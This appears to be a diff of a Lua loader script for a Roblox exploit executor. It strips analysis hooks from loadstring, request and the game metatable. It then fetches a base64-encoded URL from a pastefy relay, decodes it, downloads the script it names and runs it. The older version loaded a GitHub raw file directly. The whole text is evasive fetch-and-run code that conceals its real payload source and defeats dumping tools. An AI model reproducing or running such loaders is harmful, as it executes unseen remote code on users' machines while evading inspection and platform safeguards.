@@ -1,44 +1,40 @@
+pcall(function()
+    local mt = getrawmetatable(game)
+    if isfunctionhooked(mt.__namecall) then restorefunction(mt.__namecall) end
+    if isfunctionhooked(mt.__index) then restorefunction(mt.__index) end
+    if isfunctionhooked(mt.__newindex) then restorefunction(mt.__newindex) end
+end)
+pcall(function()
+    if isfunctionhooked(loadstring) then restorefunction(loadstring) end
+end)
+pcall(function()
+    if isfunctionhooked(request) then restorefunction(request) end
+end)
 
+-- 2. Cachear funciones limpias
+local safeLoad = clonefunction(loadstring)
+local safeGet = clonefunction(game.HttpGet)
 
-local function antiDump()
-    -- 1. Restaurar funciones hookeadas
-    local toRestore = {loadstring, request, http_request}
-    for _, fn in ipairs(toRestore) do
-        pcall(function()
-            if isfunctionhooked(fn) then
-                restorefunction(fn)
-            end
-        end)
-    end
+-- 3. Obtener URL real desde relay
+local ok, encoded = pcall(function()
+    return safeGet(game, "https://pastefy.app/3q0ZacDP/raw", true)
+end)
 
-    -- 2. Restaurar metamethods
-    pcall(function()
-        local mt = getrawmetatable(game)
-        local methods = {'__namecall', '__index', '__newindex'}
-        for _, method in ipairs(methods) do
-            if isfunctionhooked(mt[method]) then
-                restorefunction(mt[method])
-            end
-        end
-    end)
-
-    -- 3. Subir identity
-    setthreadidentity(8)
-
-    -- 4. Cachear funciones limpias
-    local safeLoad = clonefunction(loadstring)
-    local safeHttpGet = clonefunction(game.HttpGet)
-
-    return safeLoad, safeHttpGet
-end
-
-local safeLoad, safeHttpGet = antiDump()
-
--- Verificar que quedó limpio
-if isfunctionhooked(loadstring) then
-    warn("[AntiDump] No se pudo limpiar loadstring")
+if not ok or not encoded then
+    warn("[Loader] No se pudo obtener relay")
     return
 end
 
--- Ejecutar tu script de forma segura
-safeLoad(safeHttpGet(game, "https://raw.githubusercontent.com/LeyendaArlequins/Yo/refs/heads/main/yo", true))()
+local realUrl = crypt.base64decode(encoded:gsub("%s+", ""))
+
+-- 4. Ejecutar script real
+local ok2, src = pcall(function()
+    return safeGet(game, realUrl, true)
+end)
+
+if not ok2 or not src then
+    warn("[Loader] No se pudo obtener script")
+    return
+end
+
+safeLoad(src)()
